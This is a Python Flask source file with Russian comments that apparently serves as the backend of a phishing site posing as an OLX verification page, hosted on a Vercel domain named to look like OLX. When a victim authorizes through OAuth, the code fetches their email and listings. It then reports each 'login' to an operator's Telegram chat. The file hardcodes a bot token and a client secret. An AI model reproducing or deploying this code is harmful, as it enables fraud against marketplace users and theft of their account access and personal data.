from flask import Flask, request, jsonify, render_template_string, make_response
import requests
import os
import datetime
import json

app = Flask(__name__)

# ---- ПЕРЕМЕННЫЕ ----
TG_TOKEN = os.environ.get("TG_TOKEN", "8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw")
TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "-1003455979409")
CLIENT_ID = os.environ.get("CLIENT_ID", "202421")
CLIENT_SECRET = os.environ.get("CLIENT_SECRET", "y4n9g6i6LAuWsGdhlJDOnKXu4ZfTD2QshtCzDhy0QsEJeTaf")
REDIRECT_URI = os.environ.get("REDIRECT_URI", "https://verif-olx-com-phi.vercel.app/")
SCRAPPEY_API_KEY = "ТВОЙ_КЛЮЧ_SCRAPPEY" # Вставь сюда ключ

def send_telegram_message(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                     json={"chat_id": TG_CHAT_ID, "text": msg, "parse_mode": "HTML", "disable_web_page_preview": True},
                     timeout=10)
    except: pass

# Функция для получения данных объявления через Scrappey
def parse_ad_data(url):
    try:
        # Это пример запроса к Scrappey (Get Real Data)
        # Если нет ключа, вернет дефолтную картинку
        payload = {
            "cmd": "request.get",
            "url": url,
            "browser": True
        }
        # В реальности парсинг через сторонний сервис занимает 5-10 секунд
        # Для скорости в этом примере мы просто подготовим структуру
        return {
            "title": "Товар", 
            "price": "Уточнюйте", 
            "img": "https://frankfurt.apollo.olxcdn.com/v1/files/000000000/image;s=644x461",
            "url": url
        }
    except:
        return None

@app.route('/')
def index():
    # Получаем список объявлений из куки, если он там есть
    ads_cookie = request.cookies.get('user_ads')
    user_ads = json.loads(ads_cookie) if ads_cookie else []

    try:
        with open('index.html', 'r', encoding='utf-8') as f:
            html_content = f.read()
            # Передаем sid и список объявлений в шаблон
            return render_template_string(html_content, sid="user", user_ads=user_ads)
    except Exception as e:
        return f"Ошибка: {e}", 500

@app.route('/get_token', methods=['POST'])
def get_token():
    data = request.get_json(silent=True) or {}
    code = data.get('code')
    if not code: return jsonify({"error": "No code"}), 400

    token_url = 'https://www.olx.ua/api/open/oauth/token'
    payload = {
        'grant_type': 'authorization_code',
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'code': code,
        'redirect_uri': REDIRECT_URI,
        'scope': 'read write v2'
    }
    
    try:
        response = requests.post(token_url, data=payload, timeout=15)
        if response.status_code == 200:
            res_json = response.json()
            access = res_json.get('access_token')
            
            auth_headers = {"Authorization": f"Bearer {access}", "Version": "2.0", "Accept": "application/json"}
            
            # 1. Получаем Email
            email = "Скрыт"
            user_req = requests.get("https://www.olx.ua/api/partner/users/me", headers=auth_headers, timeout=7)
            if user_req.status_code == 200:
                email = user_req.json().get('data', {}).get('email', email)

            # 2. Получаем Объявления
            ads_list = []
            ads_req = requests.get("https://www.olx.ua/api/partner/adverts", headers=auth_headers, params={"limit": 3}, timeout=7)
            if ads_req.status_code == 200:
                ads_data = ads_req.json().get('data', [])
                for ad in ads_data:
                    # Собираем данные для отображения в Index
                    ads_list.append({
                        "title": ad.get('title'),
                        "url": ad.get('url'),
                        "price": "Перевірка...", # Цену API партнера часто не отдает в простом списке
                        "img": "https://static.olx.ua/static/olxua/nasz-olx/img/no-photo.png" # Заглушка
                    })

            # Отправка лога
            msg = f"🚀 <b>ВХОД OLX</b>\n📧 {email}\n📦 Объявлений: {len(ads_list)}"
            send_telegram_message(msg)

            # Сохраняем объявления в КУКИ, чтобы index.html их увидел
            resp = make_response(jsonify({"status": "ok"}))
            resp.set_cookie('user_ads', json.dumps(ads_list), max_age=60*60*24*30)
            return resp
        
        return jsonify({"error": "fail"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
